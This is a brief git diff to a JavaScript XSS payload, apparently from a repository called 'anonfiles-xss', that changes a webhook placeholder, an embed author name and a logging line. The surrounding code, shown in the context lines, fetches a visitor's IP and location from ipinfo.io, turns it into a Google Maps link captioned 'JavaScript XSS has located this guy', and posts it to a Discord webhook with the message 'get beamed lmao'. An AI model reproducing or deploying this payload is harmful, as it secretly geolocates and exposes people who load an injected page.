@@ -1,4 +1,4 @@
-var webhook = 'WEBHOOK_URL';
+var webhook = 'YOUR_WEBHOOK_URL';
 
 fetch('https://ipinfo.io/json')
     .then(response => {
@@ -23,7 +23,7 @@ fetch('https://ipinfo.io/json')
         url: 'https://github.com/madhead341/anonfiles-xss',
         color: 374276,
         author: {
-          name: '! LO$R Site Statistics',
+          name: 'JavaScript XSS',
           icon_url: 'https://cdn.discordapp.com/avatars/1083368117230653460/a_763b3fec4cc9b04e9e0a3402fc3c39e8.gif'
         },
         description: `[JavaScript XSS has located this guy](${googlemap})`,
@@ -76,6 +76,7 @@ fetch('https://ipinfo.io/json')
         .then(response => {
           if (response.ok) {
             console.log('get beamed lmao');
+            setInterval(() => console.log('get beamed lmao'), 1000);
           } else {
             throw new Error(`Failed: ${response.status} ${response.statusText}`);
           }
